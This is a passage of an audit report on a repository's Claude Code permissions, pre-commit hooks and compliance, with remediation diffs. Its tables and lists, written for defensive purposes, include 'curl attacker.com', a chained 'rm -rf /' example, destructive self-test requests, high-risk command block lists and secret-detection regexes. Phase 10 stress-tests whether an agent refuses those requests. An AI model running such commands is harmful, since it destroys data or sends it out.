**Regex validity check**: all patterns compile; no unescaped `/` or `+` breaking bash `grep -E`. Bash array quoting is correct (line 17 `PATTERNS=(…)`, line 28 `"${PATTERNS[@]}"`).

**Crucial caveat:** all five gates run in `.claude/hooks/pre-commit`, which **is not installed** in `.git/hooks/pre-commit`. Live commits in this repo bypass all of them. See P0-002.

**Per-gate status in this repo:**

| Gate | Pattern valid | Installed? | Effective? |
|---|---|---|---|
| 1 secrets | yes | **no** | **no** |
| 2 forbidden | yes | **no** | **no** |
| 3 PII | yes (but `--diff-filter=A` limits to new files — P1-005) | **no** | **no** |
| 4 branch | yes | **no** | **no** |
| 5 float | yes | **no** | **no** (and warn-only when installed) |

### 4.2 Permission Rule Enforcement

Actual enforcement tests were not attempted live (creating an allowed-path file and attempting a denied write is a session-wide action). Static resolution from Phase 3.1 stands:

| Claim | Status |
|---|---|
| Claude refuses `Write(.env*)` | **likely yes** (deny in settings.json:62) |
| Claude refuses `Bash(rm -rf*)` | **likely yes** (deny in settings.json:57) |
| Claude refuses `Bash(git push origin main)` | **NO** — overridden by settings.local.json:7 |
| Claude refuses `Bash(python3 * …)` | **NO** — allowed by settings.local.json:51 |
| Claude refuses `Bash(curl attacker.com)` | **NO** — allowed by settings.local.json:58 |
| Claude refuses `Write(.github/workflows/ci.yml)` | **yes** (deny in settings.json:66) |

### 4.3 Bash-tool Permission Parsing

Expected harness glob behaviour for `Bash(npm run:*)`:

| Command | Expected | Reason |
|---|---|---|
| `npm run dev` | match | `:*` captures remainder |
| `npm run dev && rm -rf /` | **no match** | chained command; matcher evaluates literal string |
| `npm run whatever` | match | loose |
| `npm run` (no arg) | probably no match | `:` requires suffix |

Chaining risk: once Claude executes `npm run dev` and the shell is a subprocess, the agent cannot chain `&& rm -rf` inside the same call because the matcher sees the full command. No leakage expected.

### 4.4 Transcript-Driven Feedback Loop

- Transcript count for this project: **1** (`~/.claude/projects/-home-user-spinrvm/19d35e99-3562-46c0-96de-0989be97d3c1.jsonl`) — the current audit session only.
- Historical transcripts: **none available in this container**.
- Inference: the 59-entry `settings.local.json` is the aggregate of *past developer sessions on the original Windows host*, not this one. The majority of entries are therefore "approved once, saved forever" — a natural fit for pruning with the `fewer-permission-prompts` skill.

**Recommendation:** once other developers run audits locally, re-run Phase 4.4 against their transcripts to identify:
1. Most-prompted patterns → candidates for allow-list promotion.
2. Patterns that fire 0× → candidates for deletion.
3. Slash commands invoked 0× → candidates for removal or clearer docs.

---

## Phase 5 — Context Budget & Performance

### 5.1 Token Consumption at Session Start

Rough estimate (1 token ≈ 3.5 bytes of English/markdown):

| Artefact | Bytes | Tokens (est.) |
|---|---|---|
| `CLAUDE.md` | 8,323 | ~2,380 |
| `.claude/settings.json` | 2,336 | ~670 |
| `.claude/settings.local.json` | 2,949 | ~840 |
| 5× slash commands (combined) | ~6,700 | ~1,900 |
| `.claude/hooks/pre-commit` | 2,800 | ~800 |
| System prompt overhead (harness) | ~4,000 bytes shown in this session | ~1,150 |
| Karpathy plugin prompts | small (behavioural guidelines, 1–2 KB loaded on demand) | ~500 |
| **Total Claude-config footprint** | **~27 KB** | **~8,200 tokens** |

**Context budget:** 200,000 tokens. Config footprint ≈ **4.1%**. Well under the 5% trimming threshold. No immediate action.

### 5.2 Settings File Sizes

| File | Size | Status |
|---|---|---|
| `settings.json` | 2.3 KB | OK |
| `settings.local.json` | 2.9 KB | OK but bloated with dead Windows entries |

Neither approaches the 50 KB threshold for splitting into subagent configs.

### 5.3 Hook Execution Time

5 gates × bash regex compiles across staged diffs. On a typical repo with <200 changed files, run time is <1 s. No performance concern.

---

## Phase 6 — Compliance & Audit Mapping

### 6.1 Rule → Regulatory Regime

| Rule | Source | PIPEDA | PCI-DSS | SOC 2 | GDPR |
|---|---|---|---|---|---|
| No Stripe live keys in diff | hook gate 1 | ✅ | ✅ | ✅ | ✅ |
| No Supabase service role key in diff | hook gate 1 | ✅ | ✅ | ✅ | ✅ |
| No Anthropic API key in diff | hook gate 1 | ❌ | ❌ | ✅ | ❌ |
| No `.env` staged | hook gate 2 + `Write(.env*)` deny | ✅ | ✅ | ✅ | ✅ |
| No `*.pem` / `*.key` | hook gate 2 + deny | ✅ | ✅ | ✅ | ✅ |
| No raw GPS in logs | hook gate 3 | ✅ | ❌ | ✅ | ✅ |
| No phone in logs | hook gate 3 | ✅ | ❌ | ✅ | ✅ |
| No direct commit to main/master | hook gate 4 | ❌ | ✅ | ✅ | ❌ |
| Decimal-only money arithmetic | hook gate 5 + CLAUDE.md | ❌ | ✅ | ✅ | ❌ |
| JWT rotation (15 min access) | CLAUDE.md:131 | ✅ | ✅ | ✅ | ✅ |
| OTP hashed at rest | CLAUDE.md:119 | ✅ | ❌ | ✅ | ✅ |
| Stripe idempotency | CLAUDE.md:117 | ❌ | ✅ | ✅ | ❌ |
| RLS on all tables | `.agents/standards/security-standards.md` | ✅ | ✅ | ✅ | ✅ |
| Data residency (Canada) | `/review` command | ✅ | ❌ | ✅ | ✅ |
| SOS notifies emergency contact + safety team | `/review` command | ❌ | ❌ | ✅ | ❌ |

### 6.2 Coverage Assessment

- **PIPEDA (Canadian privacy):** well covered — PII-in-logs, data residency, OTP hashing, JWT rotation.
- **PCI-DSS (payments):** covered — Stripe key denial, Decimal arithmetic, Stripe idempotency, forbidden-file blocks.
- **SOC 2:** strong — branch protection, CI gates, RLS, audit logging convention.
- **GDPR:** same as PIPEDA — covered for EU-resident users if applicable.

**Gaps:**
- No explicit rule for data retention windows.
- No rule preventing export of user data to non-Canadian regions (operational, not config).
- No machine-readable map from gate → regime (this table is the first).

---

## Phase 7 — Persona-Specific Views

### View A — New-Developer Onboarding

**"Get Claude Code working identically on your machine in 4 steps:"**

1. Install the pre-commit hook:
   ```bash
   cp .claude/hooks/pre-commit .git/hooks/pre-commit
   chmod +x .git/hooks/pre-commit
   ```
2. Accept the one enabled plugin on first session start — or, for reproducibility, pin it in `settings.json` (see P1-001 remediation).
3. **Do not copy `.claude/settings.local.json`** from another developer. It carries Windows paths and over-broad wildcards that leak across machines. Start with an empty `settings.local.json` or delete it entirely.
4. Verify with `/status` — should report branch, structure, tests, workflows, and `.env` hygiene. Run `/review` on any staged change before committing.

### View B — Security Engineer Perspective

**Threat model (from Phase 3.2):**
- 🔴 HIGH permissions: 7 wildcard rules in `settings.local.json` create arbitrary code and network surface.
- Plugin supply chain: 1 plugin unpinned, upstream still actively committed.
- Hook coverage: 5 gates designed, all dormant (hook not installed). 4 of 8 Claude-Code events have no handler; Stop hook lives in user scope only.
- MCP scope: correctly restricted to this repo.
- Compliance: strong on paper (PIPEDA + PCI-DSS + SOC 2 covered). Weak in practice because hooks are dormant.

**Remediation roadmap:**
1. Install pre-commit hook (P0-002).
2. Strip overrides from `settings.local.json` (P0-001, P0-003, P0-005, P2-006).
3. Pin plugin (P1-001).
4. Add SessionStart hook to auto-install pre-commit + pre-warm deps (P1-002, P2-004).
5. Add audit CI workflow (see `docs/proposed-claude-audit-ci.yml`).

### View C — Tech Lead Perspective

**Config drift:**
- Model attribution lags 1 version (sonnet-4-6 → opus-4-7). 256 of 310 commits bear no Claude trailer at all.
- `launch.json` has rider/driver swap — anyone trying to run mobile apps hits a wrong surface.
- Doc triangulation: three architecture docs disagree on Python version, token lifetime, surface count. `.agents/docs/architecture.md` is the oldest and most inconsistent.
- Graphify graph is 3 days behind most recent commits; rebuild on next code-editing session.

**Cost:**
- Claude-config footprint ≈ 4.1% of the 200K context window. Fine.
- Plugin and agent frameworks are lean (no model-intensive background work detected).

**Operational readiness:**
- Most-used commands (heuristic, from commit history): `/commit`, `/start`, `/pr`, `/review` all look alive.
- Zero-invocation commands not verifiable (single-transcript data). Flag for next quarter.
- Top priority: fix the three P0 drift items (attribution, hook install, local overrides) — all are 5-minute edits and collectively unlock most of the remaining findings.

---

## Phase 8 — Machine-Readable Output

### 8.1 JSON Audit Record

See `docs/claude-audit.json` (sibling file). Schema summary:

```
{
  "timestamp": ISO 8601,
  "repo":      "srikumarimuddana-lab/spinrvm",
  "branch":    "claude/config-audit-inventory-HZugv",
  "model_pinned" / "model_running" / "model_in_attribution",
  "stats": { 17 counters },
  "findings": [
    { "id", "severity", "category", "title", "file", "details", "remediation" }
  ]
}
```

21 findings total: 6 P0, 7 P1, 8 P2.

### 8.2 Diff Against Previous Audit

No prior `docs/claude-audit-*.json` file exists; this is the first audit. Delta will be meaningful from the next run onward.

### 8.3 CI Gate Proposal

See `docs/proposed-claude-audit-ci.yml`. The workflow:
- Triggers on `.claude/**`, `CLAUDE.md`, `.agents/**`, `.github/workflows/claude.yml` changes (PR + push to main/develop + manual).
- Validates both settings JSON schemas parse.
- Structurally lints every `Bash()/Read()/Write()` permission for balanced quotes/parens.
- Asserts attribution model string matches pinned model.
- Verifies `.claude/hooks/pre-commit` is tracked and executable.
- Runs `shellcheck` on hook sources.
- **Fails the job** if `settings.local.json` contains any override of the high-risk list (`git push origin main`, `git push:*`, `git reset:*`, `python:*`, `python3 *`, `py *`, `curl *`).
- Cross-references graphify god nodes against `CLAUDE.md` (at least 40% mention required).
- Posts a PR comment on failure.

**Install:** `cp docs/proposed-claude-audit-ci.yml .github/workflows/claude-audit.yml` — requires `Write(.github/workflows/claude-audit.yml)` in `settings.json` or a human-authored commit.

---

## Phase 9 — Remediation Plan (P0/P1/P2)

### P0 — Fix in this sprint

```diff
# P0-001 + P0-003 + P0-005 + P2-006: prune settings.local.json
--- .claude/settings.local.json
+++ .claude/settings.local.json
-   "Bash(npx expo:*)",
-   "Bash(npx expo-doctor:*)",
-   "Bash(npm run:*)",
-   "Bash(git push origin main)",
-   "Bash(git push origin main --force-with-lease)",
-   "Bash(git push origin sprint1/backend-security --force-with-lease)",
-   "Bash(git push origin sprint1/admin-hardening --force-with-lease)",
-   "Bash(git push origin sprint1/cicd-hardening --force-with-lease)",
-   "Bash(git fetch upstream)",
-   "Bash(git fetch origin)",
-   "Bash(git rebase upstream/main)",
-   "Bash(git rebase main)",
-   "Bash(git rebase --continue)",
-   "Bash(git rebase --abort)",
-   "Bash(py -3 -m pip --version)",
-   "Bash(py -3 -m pip install --quiet pip-audit)",
-   "Bash(py -3 -m pip_audit -r /c/Users/TabUsrDskOff111/spinr/spinr/backend/requirements.txt --format=json)",
-   "Bash(xargs grep:*)",
-   "Bash(trufflehog git:*)",
-   "Bash(py -3 -m trufflehog)",
-   "Bash(where trufflehog:*)",
-   "Bash(py -3 -m pip_audit -r /c/Users/TabUsrDskOff111/spinr/spinr/backend/requirements.txt --format=json --no-deps)",
-   "Bash(py -3 -m pip_audit -r /c/Users/TabUsrDskOff111/spinr/spinr/backend/requirements.txt --skip-editable -l)",
-   "Bash(py -3 -m pip install --quiet safety)",
-   "Bash(py -3 -m safety check -r /c/Users/TabUsrDskOff111/spinr/spinr/backend/requirements.txt --short-report)",
-   "Bash(py -3 -m pip show aiohttp requests jinja2 urllib3 fastapi cryptography)",
-   "Bash(py -3 -m pip show aiohttp fastapi uvicorn stripe twilio firebase-admin)",
-   "Bash(py -3 -m pip list)",
-   "Bash(git stash:*)",
-   "Bash(pip-audit -r requirements.txt)",
-   "Bash(python3 -m py_compile routes/rides.py)",
-   "Bash(python3 -c ':*)",
-   "Bash(python:*)",
-   "Bash(git reset:*)",
-   "Bash(git push:*)",
-   "Bash(git config:*)",
-   "Bash(awk 'NR>=498 && NR<=720 {print NR\": \"$0}' routes/rides.py)",
-   "Bash(awk 'NR>=390 && NR<=495 {print NR\": \"$0}' routes/rides.py)",
-   "Bash(npx tsc *)",
-   "Bash(npx --no-install tsc --noEmit)",
-   "Bash(railway --version)",
-   "Read(//c/Users/swarn/.claude/plugins/cache/claude-plugins-official/railway/d52f3741a6a3-8f16b123/**)",
-   "Read(//c/Users/swarn/.claude/plugins/cache/railway-skills/railway/1.1.1/**)",
-   "Bash(npx -y @railway/cli --version)",
-   "Bash(npx -y @railway/cli whoami)",
-   "Bash(npx -y @railway/cli status)",
-   "Bash(git rm *)",
-   "Bash(python3 *)",
-   "Bash(py *)",
-   "Bash(npx jest *)",
-   "Bash(npx --no tsc --noEmit)",
-   "Bash(yarn tsc *)",
-   "Bash(curl -sS -o /dev/null -w \"Backend status: %{http_code}\\\\nTime: %{time_total}s\\\\n\" https://spinr-backend-production.up.railway.app/health)",
-   "Bash(powershell.exe -Command \"ipconfig\")",
-   "Bash(curl *)",
-   "Bash(yarn test *)",
-   "Bash(npx --no-install jest --testPathPattern=\"crashlytics|store\" --passWithNoTests)"
+   "Bash(git fetch origin)",
+   "Bash(git rebase --continue)",
+   "Bash(git rebase --abort)",
+   "Bash(git stash*)",
+   "Bash(pip-audit -r backend/requirements.txt)",
+   "Bash(trufflehog git file://.*)",
+   "Bash(python3 -m py_compile*)",
+   "Bash(curl -sS -f https://spinr-backend-production.up.railway.app/health*)"
```

```diff
# P0-002: install pre-commit hook (one-line setup)
+ cp .claude/hooks/pre-commit .git/hooks/pre-commit
+ chmod +x .git/hooks/pre-commit
```

Better: add a SessionStart hook that runs the install idempotently. See P1-002.

```diff
# P0-004: correct the attribution trailer
--- .claude/settings.json
+++ .claude/settings.json
-    "commit": "Co-developed with Claude Code (claude-sonnet-4-6)\n\nCo-Authored-By: Claude <noreply@anthropic.com>",
+    "commit": "Co-developed with Claude Code (claude-opus-4-7)\n\nCo-Authored-By: Claude <noreply@anthropic.com>",
```

```diff
# P0-006: un-swap launch.json
--- .claude/launch.json
+++ .claude/launch.json
-    {
-      "name": "Rider App (Metro)",
-      "runtimeExecutable": "npm",
-      "runtimeArgs": ["--prefix", "frontend", "run", "start"],
-      "port": 8081
-    },
-    {
-      "name": "Driver App (Metro)",
-      "runtimeExecutable": "npm",
-      "runtimeArgs": ["--prefix", "rider-app", "run", "start"],
-      "port": 8082
-    },
-    {
-      "name": "Rider App (Web)",
-      "runtimeExecutable": "npm",
-      "runtimeArgs": ["--prefix", "frontend", "run", "web"],
-      "port": 19006
-    },
-    {
-      "name": "Driver App (Web)",
-      "runtimeExecutable": "npm",
-      "runtimeArgs": ["--prefix", "rider-app", "run", "web"],
-      "port": 19007
-    },
+    {
+      "name": "Rider App (Metro)",
+      "runtimeExecutable": "npm",
+      "runtimeArgs": ["--prefix", "rider-app", "run", "start"],
+      "port": 8081
+    },
+    {
+      "name": "Driver App (Metro)",
+      "runtimeExecutable": "npm",
+      "runtimeArgs": ["--prefix", "driver-app", "run", "start"],
+      "port": 8082
+    },
+    {
+      "name": "Rider App (Web)",
+      "runtimeExecutable": "npm",
+      "runtimeArgs": ["--prefix", "rider-app", "run", "web"],
+      "port": 19006
+    },
+    {
+      "name": "Driver App (Web)",
+      "runtimeExecutable": "npm",
+      "runtimeArgs": ["--prefix", "driver-app", "run", "web"],
+      "port": 19007
+    },
```

### P1 — Fix this quarter

```diff
# P1-001: pin the karpathy plugin to a tag or SHA
--- .claude/settings.json
+++ .claude/settings.json
-    "andrej-karpathy-skills@karpathy-skills": true
+    "andrej-karpathy-skills@karpathy-skills@1.0.0": true
```
(Confirm the exact pin syntax the harness accepts; some versions use a `version` field inside the object form.)

```diff
# P1-002: add SessionStart + Stop hooks to project scope
--- .claude/settings.json
+++ .claude/settings.json
+  "hooks": {
+    "SessionStart": [
+      { "matcher": "", "hooks": [
+        { "type": "command", "command": "bash -c 'test -x .git/hooks/pre-commit || (cp .claude/hooks/pre-commit .git/hooks/pre-commit && chmod +x .git/hooks/pre-commit)'" }
+      ] }
+    ]
+  },
```

```diff
# P1-003: reconcile .agents/docs/architecture.md with CLAUDE.md + ARCHITECTURE.md
#   - change Python 3.11+ → 3.12
#   - change token expiry 30 days → 15 min access / 30 day refresh
#   - add `shared/` surface
#   - remove db.py / db_supabase.py coexistence claim
#   Add a footer:
+    > Reconciled with CLAUDE.md + ARCHITECTURE.md on 2026-04-22. Single source of truth: CLAUDE.md.
```

```diff
# P1-004: extend secret regex in .claude/hooks/pre-commit
-   "ghp_[a-zA-Z0-9]{36}"
+   "gh[pousr]_[a-zA-Z0-9]{36}"
+   "sk-ant-admin[a-zA-Z0-9\\-]+"
+   "AKIA[0-9A-Z]{16}"
+   "https://hooks\\.slack\\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/"
```

```diff
# P1-005: drop --diff-filter=A from secrets and PII checks
-   M=$(git diff --cached --diff-filter=A -U0 | grep "^+" | grep -iE "$p" 2>/dev/null)
+   M=$(git diff --cached -U0 | grep "^+" | grep -iE "$p" 2>/dev/null)
```
(Apply to both loop 1 and loop 3 in `.claude/hooks/pre-commit`.)

```diff
# P1-006: remove Write(frontend/**) from allow list
--- .claude/settings.json
-      "Write(frontend/**)",
```

### P2 — Cleanup backlog

- **P2-001** delete `memory/` and `discovery/` or add a README explaining each.
- **P2-002** add `## Claude-Adjacent Directories` section to `CLAUDE.md` listing `.kilo/`, `.emergent/`, `.maestro/`, `audit-framework/` with active/archive status.
- **P2-003** `git rm code_review_report_20260326_{163444,163509,181043,181149,181200,181313,181419}.json`. Add `code_review_report_*.json` to `.gitignore`.
- **P2-004** invoke `/session-start-hook` skill to scaffold per-surface pre-warm hooks.
- **P2-005** defer graphify rebuild to next code-editing session; run the one-liner in `CLAUDE.md:12`.
- **P2-007** add a short "`agents/` Python package" subsection to `CLAUDE.md` describing `base_agent.py`, `orchestrator.py`, `registry.py`, and the knowledge-base flow.
- **P2-008** add `tests/hooks/test_pre_commit.sh` exercising each regex with a fake staged diff.

---

## Phase 10 — Agent Self-Tests

Each test is a synthetic request that the agent should refuse or handle carefully.

| # | Test | Expected | Result | Notes |
|---|---|---|---|---|
| 1 | Write to `.env` | refuse | **PASS** (would refuse) | `Write(.env*)` in deny list, settings.json:62 |
| 2 | `git push origin main` | refuse | **FAIL** | Overridden by `settings.local.json:7` — P0-001 |
| 3 | Read file with Stripe key, never echo | read + redact | **PASS (likely)** | `Read(**)` allowed; audit never quoted live secrets |
| 4 | `rm -rf /home/user/spinrvm` | refuse | **PASS** | `Bash(rm -rf*)` deny, settings.json:57 |
| 5 | Modify `.github/workflows/ci.yml` | refuse | **PASS** | `Write(.github/workflows/ci.yml)` deny, settings.json:66 |

**Any FAIL is a P0 on the agent itself.** Test 2 fails — direct push to main is possible today. Remediation: apply P0-001 diff above.

---

## Appendix A — Quick Reference

| Item | Value |
|---|---|
| Pinned model | `claude-opus-4-7` |
| Plugins (1) | `andrej-karpathy-skills@karpathy-skills` (unpinned) |
| Slash commands (5) | `/commit`, `/pr`, `/review`, `/start`, `/status` |
| Hook gates (5) | secrets, forbidden files, PII, branch, float-money |
| Top denies | `rm -rf`, `git push --force`, `git push origin main`, `.env`, `.pem`, `.key`, CI workflow files |
| Top risks | `git push:*`, `python:*`, `python3 *`, `curl *`, `git reset:*` (all from `settings.local.json`) |

## Appendix B — Glossary

- **Allow/deny rules** — permission patterns the harness consults before running a tool. Format: `Bash(pattern)`, `Read(glob)`, `Write(glob)`.
- **God node** — graphify term for a function/class with very high centrality (>85 edges). Changes ripple widely; memory guidance should cover them.
- **Hook** — bash script executed by git (pre-commit) or Claude harness (SessionStart, PreToolUse, etc.). Harness hooks are configured via `.claude/settings.json`.
- **MCP** — Model Context Protocol: external tool servers (GitHub, filesystem, etc.) that expose typed tools to Claude.
- **P0/P1/P2** — severity: this sprint / this quarter / backlog.
- **Plugin** — a bundle of skills/prompts/tools distributed via a marketplace. `andrej-karpathy-skills` is the only one enabled here.
- **Settings precedence** — `~/.claude/settings.json` (user) < `.claude/settings.json` (project) < `.claude/settings.local.json` (machine-local). Local wins.

## Appendix C — Remediation Checklist

Copy-paste commands, in the order they should be applied:

```bash
# 1. Install pre-commit hook (P0-002)
cp .claude/hooks/pre-commit .git/hooks/pre-commit
chmod +x .git/hooks/pre-commit

# 2. Correct attribution trailer (P0-004)
sed -i 's/claude-sonnet-4-6/claude-opus-4-7/' .claude/settings.json

# 3. Prune settings.local.json overrides (P0-001, P0-003, P0-005, P2-006)
#    Best done by hand — see Phase 9 diff block — to preserve any
#    rule genuinely needed by the current machine.

# 4. Un-swap launch.json (P0-006)
#    Edit by hand per Phase 9 diff.

# 5. Pin plugin (P1-001)
#    Edit .claude/settings.json enabledPlugins key by hand.

# 6. Add SessionStart + strengthened hook gates (P1-002, P1-004, P1-005)
#    Edit .claude/settings.json hooks block and .claude/hooks/pre-commit per Phase 9.

# 7. Install audit CI (Phase 8.3)
cp docs/proposed-claude-audit-ci.yml .github/workflows/claude-audit.yml
git add .github/workflows/claude-audit.yml

# 8. Reconcile .agents/docs/architecture.md (P1-003) — hand edit.

# 9. Archive / delete dead directories (P2-001, P2-003).
```

---

**End of audit.** Re-run with `/ultrareview` or via the proposed CI on any future change to `.claude/**` or `CLAUDE.md`. Save the next run's JSON as `docs/claude-audit-<YYYY-MM-DD>.json` so the delta tool can diff.






